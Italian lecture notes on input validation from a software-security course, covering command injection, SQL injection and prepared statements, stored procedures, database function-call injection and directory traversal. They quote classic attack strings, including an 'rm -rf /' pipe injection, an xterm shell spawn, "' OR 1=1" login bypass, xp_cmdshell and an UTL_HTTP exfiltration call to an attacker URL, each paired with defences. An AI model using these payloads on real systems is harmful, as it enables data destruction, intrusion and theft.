La Lezione 5 tratta la validazione dell'input come il tema che accomuna quasi tutti gli attacchi del corso: buffer overflow, command injection, SQL injection, injection nei nomi di file (directory traversal) e XSS sono tutti fallimenti nel validare un input non fidato. Affronta nel dettaglio la command injection e la SQL injection (con la correzione dei prepared statement), il directory traversal e i principi generali della validazione (non fidarsi mai dell'input, white list, privilegio minimo). Le slide sono 31. Le slide 3, 7, 22 e 25 sono la stessa slide d'indice con l'argomento corrente evidenziato; qui sono riassunte una volta sola.

## La validazione dell'input come vulnerabilità madre (pagine 2-3)

### Slide 2 · Input Validation

> - Lack of input validation is the most commonly exploited vulnerability
> - Many variants of attacks that exploit this
>   - buffer overflows - "C(++) injection" - possibly via format string attacks and integer overflow attacks
>   - Command injection
>   - SQL injection
>   - XSS (Cross site scripting) - "script injection"
>   - ...

**Approfondimento.** È la tesi centrale di tutto il corso: **la maggior parte delle vulnerabilità sfruttate sono, in fondo, fallimenti della validazione dell'input**. Il programma si fida di dati di cui non dovrebbe fidarsi, e quei dati sono costruiti da un attaccante per fargli fare qualcosa di non voluto. Viste così, le lezioni precedenti sono casi particolari:

- Un **buffer overflow** è una "injection in C(++)": input non validato (troppo lungo) iniettato in memoria, che corrompe lo stack o lo heap (Lezione 3). Ciò che lo rende possibile, gli **attacchi di format string** (Lezione 4) e gli **integer overflow**, sono a loro volta problemi di input.
- La **command injection** inietta metacaratteri della shell così che i dati diventino comandi del sistema operativo.
- La **SQL injection** inietta metacaratteri SQL così che i dati diventino comandi del database.
- L'**XSS** ("script injection") inietta HTML/JavaScript così che i dati diventino codice nel browser di una vittima.

Tutte condividono un unico meccanismo (Lezione 4, slide 23): dati non fidati passano in un interprete e vengono letti come codice. L'unica disciplina che difende da tutte è validare e sanificare l'input prima che arrivi a qualunque interprete. Le slide d'indice (3, 7, 22, 25) indicano il percorso della lezione: **buffer overflow (con format string e integer overflow) → command injection → SQL injection → injection nei nomi di file → osservazioni generali**.

## Command injection (pagine 4-6)

### Slide 4 · Command Injection (CGI script)

> - A CGI script might contain `cat thefile | mail clientaddress`
> - An attack might enter email address `pippo@di.uniroma1.it | rm -rf`
> - What happens then? `cat thefile | mail pippo@di.uniroma1.it | rm -rf/`
> - Can you think of countermeasures?
>   - validate input
>   - reduce access rights of CGI script (defense in depth)
>   - maybe we shouldn't use such a scripting languages for this?

**Analisi del codice.** Uno script CGI invia per posta il contenuto di un file a un indirizzo fornito dal client, costruendo la pipeline `cat thefile | mail <clientaddress>` ed eseguendola con una shell.

- *Vulnerabilità: command injection con la pipe `|`.* Il presunto "indirizzo e-mail" del client viene inserito senza validazione in un comando di shell. Scrivere `pippo@di.uniroma1.it | rm -rf` fa eseguire alla shell `cat thefile | mail pippo@di.uniroma1.it | rm -rf/`, quindi dopo aver spedito il file la shell esegue *anche* `rm -rf /`, nel tentativo di cancellare l'intero file system. La pipe `|` (e `;`, `` ` ``, `&`) trasformano i dati in comandi in più (lo stesso meccanismo della Lezione 4).
- *Contromisure (dalla slide).*
  1. **Validare l'input** (la principale): l'indirizzo e-mail deve corrispondere a uno schema rigido (una white list dei caratteri ammessi in un indirizzo), rifiutando ogni metacarattere della shell.
  2. **Ridurre i diritti di accesso dello script** (difesa in profondità): se il CGI gira come utente senza privilegi e in una sandbox, anche un'injection riuscita non può cancellare i file di sistema. Questo *mitiga* ma non *previene*.
  3. **Ripensare la tecnologia**: costruire pipeline di shell a partire dall'input dell'utente è intrinsecamente rischioso; una libreria che invia la posta direttamente (per esempio un'API SMTP), senza alcuna shell, elimina del tutto la superficie d'attacco.

### Slide 5 · Command Injection (C program)

```c
char buf[1024];
snprintf(buf, "system lpr -P %s", printer_name, sizeof(buf)-1);
system(buf);
```

> This can be attacked in the same way; entering `miro;xterm&` is less destructive and more interesting than `...;rm -fr /`

**Analisi del codice.** Questo codice C stampa su una stampante scelta dall'utente costruendo `lpr -P <printer_name>` e passandolo a `system`.

- *Vulnerabilità.* Come nel caso del CGI: `printer_name` viene inserito in un comando di shell eseguito da `system`, quindi i metacaratteri della shell iniettano comandi. `miro;xterm&` esegue `lpr -P miro`, poi (separatore `;`) lancia un `xterm` in background (`&`). La slide nota che un `xterm` interattivo è "più interessante" per un attaccante che distruggere dei file, perché gli dà una shell attiva. Se il programma è setuid root, quella shell è una shell di root.
- *Un bug nel frammento.* Anche la chiamata a `snprintf` è scritta **in modo sbagliato**: il prototipo corretto è `snprintf(buf, size, format, args...)`, quindi la dimensione deve essere il *secondo* argomento. Così com'è scritta (`snprintf(buf, "system lpr -P %s", printer_name, sizeof(buf)-1)`) la format string viene passata come dimensione e la dimensione come argomento, il che è sbagliato. Inoltre `"system "` non dovrebbe far parte del testo del comando `lpr`. La riga voluta è `snprintf(buf, sizeof(buf), "lpr -P %s", printer_name);`. È un dettaglio secondario; il bug di sicurezza è la chiamata a `system` su un input non validato.
- *Correzione.* Non usare `system`; usare la famiglia `exec` con un vettore di argomenti, così nessuna shell analizza `printer_name` (Lezione 4, slide 31): `execlp("lpr", "lpr", "-P", printer_name, (char*)NULL)`. Validare `printer_name` rispetto all'elenco delle stampanti reali (una white list), ed eseguire con il privilegio minimo.

### Slide 6 · Command Injection (affected APIs)

> - Vulnerability: many API calls and language constructs in many languages are affected, eg
>   - C/C++ `system()`, `execvp()`, `ShellExecute()`, ..
>   - Java `Runtime.exec()`, ...
>   - Perl `system`, `exec`, `open`, `` ` ``, `/e`, ...
>   - Python `exec`, `eval`, `input`, `execfile`, ...
> - Countermeasures
>   - validate all user input - whitelist, not blacklist
>   - run with minimal privileges - doesn't prevent, but mitigates effects

**Approfondimento.** La command injection non è un problema del C; ogni linguaggio ha costrutti che eseguono comandi esterni o valutano codice, e tutti sono pericolosi con un input non fidato:

- **C/C++**: `system` (esegue una shell), `popen`, `execlp`/`execvp` (sicuri *solo* se il vettore di argomenti non è costruito da una stringa di shell), `ShellExecute` (Windows). Si noti che `execvp` è più sicura di `system` perché non invoca una shell, purché si passino argomenti separati.
- **Java**: `Runtime.exec()` / `ProcessBuilder` (usare la forma con l'array, mai quella con una sola stringa, che viene risuddivisa).
- **Perl**: `system`, `exec`, le forme a due argomenti o a lista di `open` (un nome di file come `"rm -rf / |"` aperto per l'I/O in pipe esegue un comando), i backtick, e il modificatore `/e` delle espressioni regolari (che *valuta* come codice il testo di sostituzione).
- **Python**: `exec`, `eval`, `os.system`, `subprocess` con `shell=True`, `input` (in Python 2 `input()` valutava il suo argomento), `execfile`.
- **Contromisure (il mantra del corso):** *validare tutto l'input dell'utente con una white list, non con una black list* (Lezione 4, slide 36-38), ed *eseguire con i privilegi minimi* (privilegio minimo, Lezione 10), il che mitiga l'impatto di ogni injection che sfugge. La correzione più forte resta separare il codice dai dati (vettori di argomenti, niente shell).

## SQL injection (pagine 8-21)

### Slide 8 · SQL injection (il modulo di login)

![Lezione 5, pagina 8](L05_p08.webp "50% 1132x894")

**Figura.** Una finestra di login con due campi: **Username** = `pippo`, **Password** = `******`.

**Approfondimento.** La situazione: un modulo di login web riceve nome utente e password e li verifica su un database. Le slide successive mostrano come il back-end costruisce una query SQL a partire da questi campi e come un attaccante ne abusa.

### Slide 9-10 · SQL injection (la query vulnerabile)

```php
$result = mysql_query( "SELECT * FROM Accounts".
       "WHERE Username = '$username'". "AND Password = '$password';");
           if (mysql_num_rows($result)>0)
                  $login = true;
```

> Resulting SQL Query (for pippo / secret):
>
> `SELECT * FROM Accounts WHERE Username = 'pippo' AND Password = 'secret';`

**Analisi del codice.** Il codice costruisce una query SQL **concatenando** nella stringa della query lo `$username` e la `$password` forniti dall'utente, poi la esegue; se una riga corrisponde, il login riesce.

- Con un input onesto (`pippo` / `secret`) la query è quella innocua mostrata: seleziona l'account il cui nome utente è `pippo` e la cui password è `secret`. Se restituisce una riga, le credenziali erano corrette. Fin qui tutto bene, *per gli utenti onesti*.
- Il difetto latente: `$username` e `$password` vengono inseriti nella query **fra apici singoli**, senza alcun escaping. L'apice singolo `'` è il delimitatore delle stringhe in SQL, un metacarattere. Se l'input dell'attaccante contiene un `'`, chiude in anticipo la stringa e il resto dell'input viene analizzato come *codice* SQL. (Nota minore: nella concatenazione mancano degli spazi, quindi `Accounts`+`WHERE` diventerebbe in realtà `AccountsWHERE`; va presa come illustrativa.)

### Slide 11-13 · SQL injection (l'attacco)

![Lezione 5, pagina 11](L05_p11.webp "50% 1132x894")

**Figura (slide 11).** Lo stesso modulo di login, ora con **Username** = `' OR 1=1; /*` e **Password** = `******`.

> Resulting SQL Query:
>
> `SELECT * FROM Accounts WHERE Username = '' OR 1=1;/*' AND Password = 'secret';`
>
> What does it mean? (Slide 13 shows how the DB reads it:)
>
> ```sql
> SELECT * FROM Accounts
> WHERE Username = '' OR 1=1;
> /*' AND Password = 'secret';
> ```

**Analisi del codice.** L'attaccante scrive `' OR 1=1; /*` come nome utente.

- *Chiudere la stringa.* Il `'` iniziale chiude la stringa vuota `Username = ''`.
- *La condizione sempre vera.* `OR 1=1` viene aggiunto alla clausola `WHERE`. Poiché `1=1` è vera per **ogni** riga, la condizione `Username = '' OR 1=1` è vera per ogni riga, quindi la query restituisce *l'intera* tabella `Accounts`.
- *Scartare il controllo della password.* `;` termina l'istruzione, e `/*` apre un **commento** SQL, quindi tutto ciò che segue, `' AND Password = 'secret';`, viene **commentato** e ignorato. La password non viene mai controllata.
- *Il risultato.* `mysql_num_rows($result) > 0` è vera (vengono restituite molte righe), quindi `$login = true`: l'attaccante entra **senza conoscere alcuna password**, di solito come la prima riga, spesso l'amministratore. È l'aggiramento dell'autenticazione tramite SQL injection, una delle vulnerabilità web più dannose e più comuni.
- Varianti: ` ' OR '1'='1' --  ` (con `--` come commento), oppure ` admin' --  ` per entrare come un utente preciso. Oltre ad aggirare l'autenticazione, la SQL injection può leggere qualunque tabella (`UNION SELECT`), modificare o cancellare dati, e a volte eseguire comandi del sistema operativo (slide 19).

### Slide 14 · SQL Injection (la lezione generale)

> - Vulnerability: any application in any programming language that connects to SQL database - if it uses dynamic SQL
> - Note the common theme to many injection attacks: concatenating strings, some of them user input, and then interpreting, rendering, or executing the result is a VERY BAD IDEA

**Approfondimento.** La SQL injection non dipende dal linguaggio: colpisce **qualunque** applicazione che costruisce SQL in modo dinamico concatenando stringhe ("SQL dinamico"), in PHP, Java, Python, C#, qualunque cosa. La slide enuncia in una riga la lezione più profonda del corso: **costruire una stringa concatenando codice e dati dell'utente e poi interpretarla, visualizzarla o eseguirla è lo schema di fondo dell'injection**, che l'interprete sia una shell, un motore SQL, il parser HTML/JS di un browser o `printf`. Se si toglie la concatenazione (separando il codice dai dati) la vulnerabilità sparisce, ed è esattamente ciò che fanno i prepared statement che seguono.

### Slide 15, 17 · Avoiding SQL injection: Prepared Statement

> Vulnerable:
>
> ```java
> String updateString = "SELECT * FROM Account WHERE Username" + username + " AND Password = " + password;
> stmt.executeUpdate(updateString);
> ```
>
> Not Vulnerable:
>
> ```java
> PreparedStatement login =
> con.preparedStatement("SELECT * FROM Account WHERE Username = ? AND Password = ?" );
> login.setString(1, username);
> login.setString(2, password);
> login.executeUpdate();
> ```
>
> (Slide 17 labels the `?` placeholders "Variable Binding".)

**Analisi del codice.** La correzione definitiva della SQL injection: i **prepared statement (query parametrizzate) con variabili di binding**.

- *La versione vulnerabile* concatena `username` e `password` nella stringa della query, il bug delle slide 9-13.
- *La versione sicura* manda la query al database con dei **segnaposto** `?` al posto dei valori, e poi collega i valori veri separatamente con `setString(1, username)` e `setString(2, password)`. È il **binding delle variabili**.
- *Perché è sicura.* Il database **analizza e compila prima il modello della query**, con il `?` che indica esattamente dove va un *valore*. Le stringhe fornite dall'utente vengono poi mandate come puri **dati** che riempiono quelle posizioni; non vengono mai analizzate come SQL. Così, anche se `username` è `' OR 1=1; /*`, il database tratta l'intera stringa come un nome utente letterale da cercare: cerca un account che si chiama proprio `' OR 1=1; /*` (e non ne trova), invece di eseguirla come codice. Il confine fra codice e dati lo impone il database, non un fragile escaping.
- È la realizzazione concreta del *"separare il codice dai dati"* (Lezione 4, slide 33). Ogni API moderna per i database la offre: `PreparedStatement` di JDBC (Java), i prepared statement di PDO o mysqli con `bind_param` (PHP), le query parametrizzate della DB-API di Python (`cursor.execute(sql, params)`), `SqlCommand.Parameters` (.NET).
- **Un limite importante:** i segnaposto possono parametrizzare solo i *valori*, non i nomi di tabelle o colonne né le parole chiave SQL. Se queste parti devono essere dinamiche, vanno validate con una white list rigida, mai concatenate.

### Slide 16 · Similar: Stored Procedures

```sql
CREATE PROCEDURE login
         (name VARCHAR(100), pwd VARCHAR(100)) AS
DECLARE @sql nvarchar(4000)
SELECT @sql =' SELECT * FROM Account WHERE username=' + @name + 'AND password=' + @pwd
EXEC (@sql)
```

> Called from Java with:
>
> ```java
> CallableStatement proc =
> connection.prepareCall("{call login(?, ?)}");
> proc.setString(1, username);
> proc.setString(2, password);
> ```

**Analisi del codice.** Una **stored procedure** è codice conservato ed eseguito dentro il database; viene *spesso* suggerita come misura contro l'injection, e il lato Java (il binding dei parametri `?` con `CallableStatement`) è in effetti sicuro. **Ma il corpo della procedura mostrato qui è a sua volta vulnerabile!**

- *Il difetto.* Dentro la procedura i parametri `@name` e `@pwd` vengono **concatenati in una stringa SQL dinamica** `@sql`, poi eseguita con `EXEC(@sql)`. Così l'injection si sposta semplicemente *dentro* la stored procedure: passare `@name = ' OR 1=1; /*` riproduce esattamente l'aggiramento dell'autenticazione della slide 12, ora eseguito da `EXEC`. La lezione: **una stored procedure non è automaticamente sicura**; lo è solo se *anch'essa* usa la parametrizzazione al suo interno ed evita l'SQL dinamico (`EXEC`/`sp_executesql` su stringhe concatenate).
- *Correzione.* Scrivere la procedura come una query statica parametrizzata (`SELECT * FROM Account WHERE username = name AND password = pwd;`, niente SQL dinamico) oppure, se l'SQL dinamico serve davvero, usare `sp_executesql` con parametri collegati. La chiamata dall'applicazione deve collegare i valori (come mostrato) e il corpo della procedura deve fare lo stesso.
- *Note a margine.* L'esempio mescola la sintassi PL/SQL di Oracle nel titolo della slide con la sintassi a variabili `@` di SQL Server nel corpo, e conservare o confrontare password in chiaro è già di per sé un difetto grave (le password vanno salvate con salt e un hash lento, Lezione 1, slide 14). Sono dettagli secondari rispetto al punto di injection.

### Slide 18 · Some Observations

> - Other issues - besides security - in discussions about prepared statements, stored procedures, bind variables, ...
>   - efficiency
>   - bandwidth between web-app and database
>   - stored procedures allow common fixed interface to several web-apps
> - Moral of the story: check the details for your configuration (language, database system) and your chosen solution!
> - Open question: Why is SQL injection still a problem??? - NB Top vulnerability in OWASP Top 10. Why doesn't everyone use parameterised queries???

**Approfondimento.** I prepared statement non sono solo più sicuri, hanno spesso **vantaggi che non riguardano la sicurezza**: il database compila e mette in cache il piano della query una volta sola e lo riusa a ogni esecuzione (efficienza), sulla rete viaggia meno testo SQL (banda), e le stored procedure danno a più applicazioni un'unica interfaccia fissa e condivisa verso i dati. Così l'opzione sicura è spesso anche quella costruita meglio.

La domanda provocatoria, *perché la SQL injection è ancora così comune* nonostante una correzione economica, ben nota e perfino vantaggiosa per le prestazioni, resta aperta di proposito. Risposte realistiche: codice legacy scritto prima che il rischio fosse capito; sviluppatori inconsapevoli o sotto pressione; ORM e query builder che permettono ancora query grezze come via di fuga; parti dinamiche (nomi di tabella, colonne di `ORDER BY`) che non si possono parametrizzare e vengono concatenate; esempi insicuri copiati e incollati. La morale pratica: conoscere il comportamento esatto del *proprio* linguaggio e del *proprio* database, e verificare che la difesa scelta parametrizzi davvero.

### Slide 19 · Variation: Database Command Injection

> - injecting database command with `;`
> - not manipulating SQL query with `'`
> - highly dependent on infrastructure, e.g.
>   - each database has its own commands - E.g. Microsoft SQL Server has `exec master.dbo.xp_cmdshell`
>   - some configurations don't allow use of `;` - E.g. Oracle database accessed via Java or PL/SQL

![Lezione 5, pagina 19](L05_p19_1.webp "50% 1400x442")

**Approfondimento.** Una variante distinta: invece di manipolare la *logica della query* con l'apice `'`, l'attaccante usa il separatore di istruzioni `;` per **aggiungere un comando di database del tutto nuovo** ("stacked queries"). Le possibilità dipendono molto dal DBMS:

- **Microsoft SQL Server** in passato espone `xp_cmdshell`, una stored procedure estesa che esegue **comandi del sistema operativo** dall'interno del database. Un `; exec master.dbo.xp_cmdshell 'net user ...'` iniettato trasforma la SQL injection nell'esecuzione di comandi del sistema operativo sul server del database. (Nelle versioni moderne di SQL Server è disattivata per impostazione predefinita proprio per questo motivo.)
- **Alcune configurazioni vietano le query accodate** (`;`): Oracle tramite JDBC/PL/SQL in genere non permette più istruzioni in una sola chiamata, il che lì blocca questa variante, anche se le altre forme di injection restano valide.
- La conclusione: l'*impatto* della SQL injection dipende dall'infrastruttura e può andare ben oltre il database (fino alla compromissione completa del server). Le difese vanno applicate comunque, e il database deve girare con il privilegio minimo (niente `xp_cmdshell`, un account del database con pochi privilegi).

### Slide 20 · Variation: Function Call Injection

> - Oracle SQL has > 1000 built-in functions that can be used inside stored procedures, eg TRANSLATE: `TRANSLATE('acadaa', 'abcd', 'ABCD') = 'ACADAA'`
> - Arguments of such functions may be poisoned with other functions, e.g. `SELECT TRANSLATE('user input', 'abcd', 'ABCD') FROM ...` can become `SELECT TRANSLATE(''|| UTL_HTTP.REQUEST(http://.....) ||'', 'abcd', 'ABCD') FROM ...`
> - UTL\_HTTP does HTTP request directly from Oracle database, which is probably running behind the firewall...

**Analisi del codice.** Una terza variante: iniettare una **chiamata di funzione** invece di una clausola della query.

- `TRANSLATE` è un'innocua funzione di Oracle sulle stringhe. Ma se l'input dell'utente finisce nel suo argomento, l'attaccante può iniettare una funzione predefinita *diversa* e pericolosa tramite la concatenazione di stringhe (`||` è l'operatore di concatenazione di Oracle). Qui l'argomento innocuo viene sostituito da `'' || UTL_HTTP.REQUEST('http://attacker...') || ''`.
- **`UTL_HTTP.REQUEST`** fa eseguire al database Oracle stesso una richiesta HTTP in uscita. È potente per due motivi: può **esfiltrare dati** (aggiungendo i dati rubati all'URL dell'attaccante) e parte **dall'interno della rete**, dietro il firewall, quindi può raggiungere sistemi interni che l'attaccante non raggiunge direttamente (una server-side request forgery, SSRF, fatta dal database). Funziona anche in una configurazione in cui le query accodate con `;` sono bloccate (slide 19), perché vive dentro un'unica espressione.
- *Correzione.* Come per tutta la SQL injection: non costruire mai SQL o sue sottoespressioni da input non validato; usare variabili di binding, così l'input è un valore e non parte di un'espressione; limitare i privilegi di rete e sui package del database (revocare `UTL_HTTP`).

### Slide 21 · Countermeasures to SQL injection

> - input validation
> - use prepared statements aka parameterised queries with bind variables - not string concatenation - or stored procedures, if these are safe
> - use language/system level countermeasures - eg magic quotes in PHP
> - apply principle of least privilege - ie. minimise rights of web application
> - know what you're doing: find out the threats & countermeasures for your specific configuration, programming language, database system…

**Approfondimento.** La difesa a strati, dalla migliore:

- I **prepared statement / query parametrizzate con variabili di binding** sono la correzione principale e affidabile (mai la concatenazione di stringhe). Le stored procedure aiutano *solo se* sono a loro volta parametrizzate (slide 16).
- La **validazione dell'input** come difesa in profondità: anche con la parametrizzazione, validare che gli input abbiano il tipo, la lunghezza e il formato attesi (un nome utente è alfanumerico, un'età è un intero in un intervallo).
- **Contromisure del linguaggio o del sistema** come le vecchie `magic_quotes` di PHP facevano l'escaping automatico degli apici, ma sono un cerotto *debole e deprecato* (tolto in PHP 5.4): si possono aggirare (codifiche, contesti numerici non racchiusi fra apici) e danno una falsa sicurezza. La slide le cita come esempio, non come raccomandazione.
- **Privilegio minimo**: l'account del database dell'applicazione web deve avere solo i diritti che gli servono (per esempio SELECT/INSERT su tabelle precise, niente DROP, niente `xp_cmdshell`, nessun accesso ai file), così un'injection riuscita fa danni limitati.
- **Conoscere il proprio stack**: le minacce e le difese esatte dipendono dal linguaggio e dal DBMS; vanno verificate per la propria configurazione.

## Injection nei nomi di file / directory traversal (pagine 23-24)

### Slide 23 · File name injection

> - user-supplied file name may be
>   - existing file `../../../etc/passwd`
>   - not really a file `/var/spool/lpr`
>   - file the user can access in other ways `/mnt/usbkey`, `/tmp/file`
> - this may break
>   - Confidentiality (leaking information to the user)
>   - Integrity (eg. of file or system)
>   - Availability (eg. trying to open print device for reading)

**Approfondimento.** Quando un programma apre un file il cui nome viene dall'utente, l'attaccante può fornire un nome mai previsto, attaccando tutti e tre gli obiettivi CIA:

- **Un file sensibile esistente**: `../../../etc/passwd` usa `..` per uscire dalla directory prevista e leggere un file di sistema (il classico *path/directory traversal*), violando la **riservatezza**.
- **Un "file" che in realtà è un dispositivo o un file speciale**: `/var/spool/lpr`, `/dev/...`. Aprire un dispositivo per l'operazione sbagliata può bloccarlo o disturbarlo, violando la **disponibilità** (l'esempio della slide "open print device for reading"), oppure corromperlo, violando l'**integrità**.
- **Un file raggiungibile in altri modi**: `/mnt/usbkey`, `/tmp/file`, che permette all'utente di leggere o influenzare dati fuori dall'ambito previsto.

### Slide 24 · File name injection (costruire nomi dall'input)

> - File names constructed from user input - eg by string concatenation - are suspect too
>   - Eg what is `"/usr/local/client-info/" ++ name`. What if name is `../../../etc/passwd`?
> - aka directory traversal attack
> - validating file names is difficult: reuse existing code and/or use chroot jail

**Analisi del codice.** Costruire un percorso concatenando un prefisso fisso con l'input dell'utente è lo stesso anti-pattern di concatenazione di stringhe della SQL injection.

- *Vulnerabilità.* `"/usr/local/client-info/" + name` sembra confinato in una directory, ma se `name = "../../../etc/passwd"`, le componenti `..` risalgono fuori da `client-info` e il percorso risultante è `/etc/passwd`. Il prefisso dà una falsa sicurezza. È il **directory (path) traversal** (CWE-22).
- *Perché validare è difficile.* I nomi di file hanno molte trappole: sequenze `..`, percorsi assoluti, link simbolici (che puntano altrove), codifiche (`..%2f`, `..%c0%af` come nei worm Unicode di IIS), separatori di percorso diversi su Windows (`\`), punti e spazi finali, troncamento con il byte NUL, e file system che non distinguono maiuscole e minuscole o normalizzano l'Unicode. Un filtro ingenuo che "toglie `..`" si aggira facilmente (per esempio `....//` diventa `../` dopo un passaggio, il problema dei passaggi multipli della Lezione 4, slide 41).
- *Difese (dalla slide, più quelle standard).* **Riusare codice esistente e collaudato** invece di scriversi il proprio sanificatore di nomi di file. **Usare una chroot jail** (o un container), così il processo non può vedere file fuori da un sottoalbero confinato anche se il traversal riesce. L'approccio robusto da programma: **canonizzare** il percorso finale (`realpath`) e verificare che cominci ancora con la directory base prevista *dopo* aver risolto `..` e i link simbolici; oppure, meglio, non accettare affatto nomi di file, ma usare un identificatore opaco (un indice o una chiave) che corrisponde a un nome di file sicuro scelto dal server (white list). Applicare il privilegio minimo, così il processo comunque non può leggere i file sensibili.

## Osservazioni generali sulla validazione dell'input (pagine 26-32)

### Slide 26 · Input Validation in general

> - Input validation problems are the most common vulnerabilities
> - Never ever trust any user input
>   - Apart from generic risks discussed so far (command, SQL, XSS, filenames,...), there will be additional input risks specific to an application
> - Beware of implicit assumptions on user input
>   - eg, that usernames only contain alphanumeric characters
> - Think like an attacker!
>   - think how you might abuse a system with weird input

**Approfondimento.** I principi guida:

- **Non fidarsi mai di alcun input dell'utente.** "Input dell'utente" significa *tutto* ciò che arriva da fuori del confine di fiducia: campi dei moduli, parametri dell'URL, cookie, intestazioni HTTP, file caricati, payload delle API, dati di altri sistemi, perfino dati del proprio database se li ha originati un utente. Ogni applicazione ha anche rischi sull'input *specifici del dominio*, oltre alle classi generiche di injection.
- **Attenzione alle ipotesi implicite.** Il codice presume spesso in silenzio che gli input siano "ragionevoli" (un nome utente è alfanumerico e corto, una quantità è positiva, una data è valida). Gli attaccanti violano di proposito queste ipotesi. Ogni ipotesi va resa esplicita e fatta rispettare.
- **Pensare come un attaccante** (Lezione 1, slide 32): per ogni input chiedersi "qual è il valore più strano e più ostile che qualcuno potrebbe mandare, e che cosa farebbe?". Questa mentalità avversaria è il cuore dello sviluppo sicuro.

### Slide 27 · Input Validation: prevention

> - Find out about potential vulnerabilities: use community resources to find out vulnerabilities of the system/language used
> - avoid use of unsafe constructs, if possible
> - make sure all input is validated at clear choke-points in code when doing input validation:
>   - use white-lists, not black-lists - unless you are 100% sure your black-list is complete
>   - reuse existing input validation code known to be correct

**Approfondimento.** Come *prevenire* i bug di validazione dell'input:

- **Imparare le trappole note** del proprio linguaggio e della propria piattaforma dalle risorse della comunità (OWASP, CWE, CERT, avvisi dei produttori), perché la maggior parte delle vulnerabilità sono varianti di schemi ben documentati.
- **Evitare i costrutti insicuri** (`system`, `eval`, SQL dinamico, `gets`) quando esiste un'alternativa sicura.
- **Validare in punti di passaggio obbligati e chiari.** Centralizzare la validazione in modo che tutto l'input passi per pochi punti ben verificati (invece di controlli sparsi qua e là nel codice, facili da dimenticare). Questo rende possibile verificare che *niente* di non validato arrivi a un punto sensibile.
- **White list, non black list** (Lezione 4, slide 36-38): elencare ciò che è ammesso e rifiutare il resto, a meno di poter dimostrare che una black list è completa (non si può quasi mai: l'a capo di phf).
- **Riusare codice di validazione collaudato** invece di reinventarlo, perché i sanificatori sono notoriamente difficili da scrivere bene.

### Slide 28 · Input Validation: detection

> - testing: test with inputs likely to cause problems
>   - for buffer overflow, long inputs (fuzzing)
>   - for SQL injection, inputs with fragments of SQL commands
>   - ...
>   - There are some tools that can help, eg webscarab for XSS. Note: web-application returning a page with SQL error message is a bad sign...
> - tainting
>   - effectively typing, with runtime checking or static analysis (more precisely, data flow analysis) - eg SA\_PRE(Tainted=SA\_True) in PREfast
> - code reviews, possibly using static analysis

**Approfondimento.** Come *rilevare* i bug di validazione dell'input sfuggiti:

- **Test mirati / fuzzing.** Provare con gli input che di solito rompono le cose: stringhe molto lunghe (buffer overflow, Lezione 3), stringhe con frammenti SQL (`' OR 1=1`), metacaratteri della shell, HTML/script (XSS), sequenze di path traversal. Strumenti come *WebScarab* (un proxy web di OWASP) aiutano a sondare le applicazioni web. Un sintomo rivelatore: se inviare un `'` fa restituire all'applicazione un **messaggio di errore del database**, è quasi certamente vulnerabile alla SQL injection (e fa uscire dettagli interni, già di per sé una divulgazione di informazioni).
- **Taint analysis (tainting).** Trattare ogni input esterno come *contaminato* e seguirne il flusso; segnalare ogni percorso in cui dati contaminati arrivano a un punto sensibile (una query, un comando, una chiamata al file system) senza essere sanificati. È "di fatto un sistema di tipi" (contaminato e non contaminato) imposto o **durante l'esecuzione** (il taint mode di Perl, Lezione 4, slide 33) o **staticamente** con l'analisi del flusso dei dati (le annotazioni PREfast di Microsoft come `SA_Pre(Tainted=SA_True)`; sviluppata nella Lezione 7).
- **Revisione del codice e analisi statica**: revisione umana più scanner automatici per trovare la validazione mancante (Lezione 3, slide 50; Lezione 7).

### Slide 29 · 19 Deadly Sins of Software Security

![Lezione 5, pagina 29](L05_p29.webp "50% 1400x971")

**Figura.** Un elenco su due colonne (Howard, LeBlanc, Viega, 2005); le voci in blu sono segnalate come "problemi di input":

| Peccato capitale | Problema di input? |
| --- | --- |
| Buffer overruns | sì |
| Format string problems | sì |
| Integer overflows | sì |
| SQL injection | sì |
| Command injection | sì |
| Failing to handle errors | no |
| XSS (cross-site scripting) | sì |
| Failing to protect network traffic | no |
| Use of magic URLs or hidden form fields | sì |
| Improper use of TLS, SSL | no |
| Weak passwords | no |
| Failing to store & protect data securely | no |
| Information leakage | sì |
| Improper file access | sì |
| Trusting network name resolution | sì |
| Race conditions | no |
| Unauthenticated key exchange | no |
| Weak random numbers | no |
| Poor usability | no |

**Approfondimento.** Questo elenco classico (*19 Deadly Sins of Software Security*) cataloga gli errori di sicurezza più comuni. Il punto della slide: **una grossa parte di essi (quelli in blu) sono problemi di validazione dell'input**: buffer overrun, format string, integer overflow, SQL/command injection, XSS, magic URL e campi nascosti (fidarsi dei dati lato client), fughe di informazioni, accesso ai file improprio e fiducia nella risoluzione dei nomi di rete (DNS) sono tutti fallimenti nel validare o nel diffidare dell'input esterno. Questo sostiene con i dati la tesi della lezione: la validazione dell'input è *la* classe di vulnerabilità dominante. I peccati che non riguardano l'input (uso sbagliato della crittografia, password deboli, race condition, ecc.) sono gli argomenti di altre lezioni.

### Slide 31 · Classification of Software Security Errors (Seven Pernicious Kingdoms)

> 1. Input Validation and Representation
> 2. API Abuse
> 3. Security Features
> 4. Time and State
> 5. Errors
> 6. Code Quality
> 7. Encapsulation \*. Environment
>
> \[Katrina Tsipenyuk, Brian Chess, Gary McGraw, Seven Pernicious Kingdoms: A Taxonomy of Software Security Errors\]

**Approfondimento.** I *Seven Pernicious Kingdoms* sono una tassonomia influente che raggruppa gli errori di sicurezza del software in categorie ("regni"), ordinate per quanto spesso causano problemi. Significativamente, **"Input Validation and Representation" è il regno numero 1**, di nuovo con la validazione dell'input in cima. Gli altri: *API Abuse* (chiamare un'API in un modo che ne viola il contratto, per esempio ignorando i valori restituiti), *Security Features* (uso sbagliato di autenticazione, controllo degli accessi, crittografia), *Time and State* (race condition, Lezione 11), *Errors* (gestione sbagliata di errori ed eccezioni), *Code Quality* (comportamenti imprevedibili dovuti a codice scadente, per esempio memory leak, double free), *Encapsulation* (non separare i componenti fidati da quelli non fidati), e il regno a parte *Environment* (problemi di configurazione e di installazione fuori dal codice). Questa tassonomia è alla base degli strumenti di analisi statica (Fortify) che classificano le loro segnalazioni.

### Slide 32 · One of the CVE Classifications

![Lezione 5, pagina 31](L05_p31.webp "50% 1400x1050")

**Figura.** Uno schema ad albero ("Weaknesses Used by JVN iPedia") con una gerarchia di categorie di debolezze CWE, con radice in **CWE-1 Location**, che si ramifica in **CWE-16 Configuration**, **CWE-17 Code**, **CWE-2 Environment**. Sotto **Code → CWE-18 Source Code** l'albero si apre nelle principali famiglie di debolezze:

